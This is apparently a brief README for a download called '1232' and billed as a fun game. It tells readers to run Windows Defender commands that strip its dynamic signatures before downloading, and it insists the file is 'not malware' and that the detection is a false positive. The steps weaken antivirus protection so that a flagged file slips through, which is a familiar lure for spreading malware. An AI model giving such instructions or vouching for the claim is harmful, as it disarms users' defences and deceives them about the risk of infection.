# 1232
run this command in command prompt before downloading
this resolves the false positive for windows defender
this is not malware but its a fun game

cd %ProgramFiles%\Windows Defender

MpCmdRun.exe -removedefinitions -dynamicsignatures

MpCmdRun.exe -SignatureUpdate
